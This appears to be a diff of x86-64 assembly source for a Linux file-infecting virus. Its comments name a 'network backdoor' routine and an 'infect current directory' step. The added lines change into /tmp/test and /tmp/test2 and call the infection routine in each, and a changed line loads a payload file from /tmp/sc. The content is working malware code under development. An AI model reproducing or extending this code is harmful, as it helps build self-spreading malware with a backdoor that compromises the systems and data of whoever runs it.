@@ -19,11 +19,38 @@ _start:
 	add rsp, 8
 	;create network backdoor
 	call create_network_backdoor
+	;chdir to /tmp/test
+	mov rax, 80
+	xor rdi, rdi
+	mov rdi, 0x0074; "t\0"
+	push rdi
+	mov rdi, 0x7365742f706d742f; "/tmp/tes"
+	push rdi
+	lea rdi, [rsp]
+	syscall; chdir("/tmp/test");
+	add rsp, 16
 	;infect current directory
 	push 0x0000002e; our target directory here "."
 	lea rdi, [rsp]
 	call list_files
 	add rsp, 8
+
+;chdir to /tmp/test2
+	mov rax, 80
+	xor rdi, rdi
+	mov rdi, 0x003274; "t2\0"
+	push rdi
+	mov rdi, 0x7365742f706d742f;"/tmp/tes"
+	push rdi
+	lea rdi, [rsp]
+	syscall; chdir("/tmp/test");
+	add rsp, 16
+	;infect current directory
+	push 0x0000002e; our target directory here "."
+	lea rdi, [rsp]
+	call list_files
+	add rsp, 8
+
 exit_prog:
 	mov	rax, 0x3c;
 	mov rdi, 1
@@ -1588,8 +1615,9 @@ push rdi
 	;OPEN SC FILE
 	push rdi
 	mov rax, 2
-	push 0x00006373 ; "sc"
-	mov rdi, rsp
+	mov rdi, 0x0063732f706d742f ; "/tmp/sc"
+	push rdi
+	lea rdi, [rsp]
 	xor rsi, rsi
 	xor rdx,rdx
 	syscall; open("sc", O_RDONLY); 
